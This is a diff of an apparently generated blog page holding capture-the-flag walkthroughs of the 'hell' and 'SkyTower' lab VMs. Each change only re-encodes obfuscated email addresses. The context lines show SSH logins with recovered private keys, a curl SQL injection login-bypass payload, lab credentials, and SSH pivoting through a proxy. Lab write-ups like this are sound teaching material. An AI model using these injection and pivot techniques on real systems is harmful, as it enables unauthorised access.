 Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>
 
 <p>The programs included with the Debian GNU/Linux system are free software;
@@ -1054,7 +1964,7 @@ $ /bin/chmod 600 authorized_keys
 <p>Now we can SSH into the VM as <code>george</code></p>
 
 <p>```bash SSH Access as george
-root@kali:~# ssh <a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#58;&#x67;&#x65;&#x6f;&#x72;&#103;&#101;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#x2e;&#53;&#54;&#46;&#x31;&#x30;&#x32;">&#x67;&#101;&#111;&#x72;&#103;&#101;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#54;&#56;&#46;&#x35;&#x36;&#46;&#49;&#x30;&#50;</a> -i id_rsa
+root@kali:~# ssh <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#x3a;&#x67;&#x65;&#x6f;&#114;&#x67;&#101;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#x2e;&#53;&#54;&#46;&#x31;&#48;&#50;">&#103;&#101;&#111;&#x72;&#x67;&#x65;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x35;&#54;&#x2e;&#49;&#48;&#x32;</a> -i id_rsa
 Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>
 
 <p>The programs included with the Debian GNU/Linux system are free software;
@@ -1076,8 +1986,8 @@ george@hell:~$
 
 <p>```bash George&rsquo;s Signup Mail
 george@hell:~$ cat /var/mail/george/signup.eml
-From: <a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#x3a;&#x61;&#x64;&#x6d;&#x69;&#110;&#x40;&#114;&#111;&#x63;&#107;&#x79;&#x6f;&#x75;&#46;&#x63;&#111;&#x6d;">&#97;&#x64;&#109;&#105;&#x6e;&#x40;&#114;&#x6f;&#x63;&#x6b;&#x79;&#x6f;&#x75;&#46;&#x63;&#x6f;&#x6d;</a>
-To: <a href="&#109;&#x61;&#105;&#108;&#x74;&#x6f;&#58;&#115;&#x75;&#112;&#x65;&#114;&#95;&#97;&#100;&#x6d;&#105;&#x6e;&#64;&#x68;&#x65;&#x6c;&#x6c;&#46;&#99;&#111;&#109;">&#x73;&#x75;&#x70;&#101;&#x72;&#95;&#x61;&#100;&#x6d;&#105;&#110;&#x40;&#x68;&#101;&#108;&#108;&#46;&#99;&#111;&#x6d;</a>
+From: <a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#97;&#x64;&#x6d;&#105;&#x6e;&#x40;&#x72;&#x6f;&#99;&#x6b;&#121;&#111;&#117;&#46;&#x63;&#111;&#x6d;">&#x61;&#x64;&#109;&#105;&#110;&#64;&#114;&#111;&#99;&#x6b;&#x79;&#x6f;&#117;&#46;&#x63;&#x6f;&#x6d;</a>
+To: <a href="&#x6d;&#x61;&#105;&#108;&#116;&#x6f;&#x3a;&#115;&#x75;&#x70;&#101;&#114;&#95;&#97;&#x64;&#x6d;&#105;&#110;&#x40;&#104;&#101;&#x6c;&#108;&#x2e;&#99;&#x6f;&#x6d;">&#115;&#117;&#112;&#x65;&#x72;&#x5f;&#97;&#100;&#x6d;&#x69;&#x6e;&#x40;&#104;&#x65;&#108;&#108;&#x2e;&#99;&#x6f;&#109;</a>
 Subject: Account Activation
 Date: 13th November 2009</p>
 
@@ -1170,7 +2080,7 @@ george@hell:/media/truecrypt1$
 <p>So, a rsa private key. A wild shot in the dark sais this is the private key for one of the other users as per the <code>/etc/passwd</code>. I saved the key to a file on my Kali Linux box and attempted to SSH in as <code>bazza</code>, specifying the private key to use:</p>
 
 <p>```bash ssh access as Bazza
-root@kali:~# ssh <a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x62;&#x61;&#x7a;&#x7a;&#97;&#x40;&#49;&#x39;&#50;&#46;&#49;&#54;&#x38;&#46;&#x35;&#x36;&#46;&#x31;&#x30;&#50;">&#98;&#97;&#122;&#x7a;&#97;&#64;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#x38;&#x2e;&#53;&#54;&#46;&#49;&#x30;&#50;</a> -i truecrypt_id_rsa
+root@kali:~# ssh <a href="&#109;&#x61;&#105;&#108;&#x74;&#x6f;&#58;&#98;&#97;&#122;&#x7a;&#97;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#x2e;&#x35;&#54;&#x2e;&#49;&#48;&#x32;">&#x62;&#97;&#122;&#122;&#97;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x35;&#54;&#x2e;&#x31;&#48;&#x32;</a> -i truecrypt_id_rsa
 Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>
 
 <p>The programs included with the Debian GNU/Linux system are free software;
@@ -1451,7 +2361,7 @@ $ curl &mdash;data &ldquo;email=foo@bar&amp;password=&lsquo; || 1=1#&rdquo; <a h
                             "&gt;
 </code></pre>
 
-<p>   <br><strong><font size=4>Welcome <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#111;&#x3a;&#x6a;&#x6f;&#x68;&#x6e;&#x40;&#x73;&#107;&#x79;&#x74;&#101;&#99;&#104;&#x2e;&#99;&#x6f;&#x6d;">&#x6a;&#111;&#x68;&#x6e;&#64;&#115;&#107;&#x79;&#x74;&#x65;&#99;&#x68;&#x2e;&#99;&#x6f;&#109;</a></font><br /> </br></strong>As you may know, SkyTech has ceased all international operations.<br><br> To all our long term employees, we wish to convey our thanks for your dedication and hard work.<br><br><strong>Unfortunately, all international contracts, including yours have been terminated.</strong><br><br> The remainder of your contract and retirement fund, <strong>$2</strong> ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.<br><br><strong>Username: john</strong><br><strong>Password: hereisjohn</strong> <br><br> We wish you the best of luck in your future endeavors. <br> </div> </div></HTML>%
+<p>   <br><strong><font size=4>Welcome <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#106;&#x6f;&#x68;&#x6e;&#x40;&#x73;&#x6b;&#x79;&#116;&#x65;&#x63;&#104;&#x2e;&#99;&#x6f;&#x6d;">&#106;&#111;&#104;&#110;&#64;&#115;&#107;&#x79;&#x74;&#101;&#x63;&#x68;&#x2e;&#99;&#x6f;&#x6d;</a></font><br /> </br></strong>As you may know, SkyTech has ceased all international operations.<br><br> To all our long term employees, we wish to convey our thanks for your dedication and hard work.<br><br><strong>Unfortunately, all international contracts, including yours have been terminated.</strong><br><br> The remainder of your contract and retirement fund, <strong>$2</strong> ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.<br><br><strong>Username: john</strong><br><strong>Password: hereisjohn</strong> <br><br> We wish you the best of luck in your future endeavors. <br> </div> </div></HTML>%
 ```</p>
 
 <p>And success. We have made some progress :D Little did I know that I don&rsquo;t actually completely understand the progress made yet, but just keep this in mind :)</p>
@@ -1462,10 +2372,10 @@ $ curl &mdash;data &ldquo;email=foo@bar&amp;password=&lsquo; || 1=1#&rdquo; <a h
 I setup my <code>proxychains</code> install to use the http proxy available on the server (<code>http 192.168.137.242 3128</code>) and opened a SSH session through it:</p>
 
 <p>```bash SSH via Squid Proxy
-$ proxychains4 ssh <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#106;&#111;&#104;&#110;&#x40;&#49;&#50;&#55;&#x2e;&#48;&#46;&#x30;&#x2e;&#49;">&#x6a;&#111;&#x68;&#x6e;&#64;&#49;&#50;&#55;&#x2e;&#48;&#x2e;&#x30;&#46;&#49;</a>
+$ proxychains4 ssh <a href="&#x6d;&#97;&#105;&#108;&#116;&#x6f;&#x3a;&#106;&#x6f;&#104;&#110;&#64;&#x31;&#50;&#x37;&#x2e;&#48;&#x2e;&#x30;&#46;&#x31;">&#x6a;&#111;&#104;&#x6e;&#x40;&#x31;&#50;&#x37;&#x2e;&#x30;&#46;&#x30;&#x2e;&#x31;</a>
 [snip]
 [proxychains] Strict chain  &hellip;  192.168.137.242:3128  &hellip;  127.0.0.1:22  &hellip;  OK
-<a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#x3a;&#x6a;&#111;&#x68;&#110;&#64;&#49;&#50;&#x37;&#x2e;&#48;&#46;&#x30;&#x2e;&#x31;">&#x6a;&#x6f;&#x68;&#x6e;&#x40;&#49;&#50;&#55;&#46;&#x30;&#x2e;&#x30;&#x2e;&#49;</a>&rsquo;s password:
+<a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#x6a;&#111;&#104;&#110;&#x40;&#49;&#50;&#55;&#x2e;&#x30;&#x2e;&#x30;&#46;&#49;">&#106;&#x6f;&#104;&#x6e;&#64;&#x31;&#x32;&#55;&#46;&#48;&#x2e;&#48;&#x2e;&#x31;</a>&rsquo;s password:
 Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64</p>
 
 <p>The programs included with the Debian GNU/Linux system are free software;
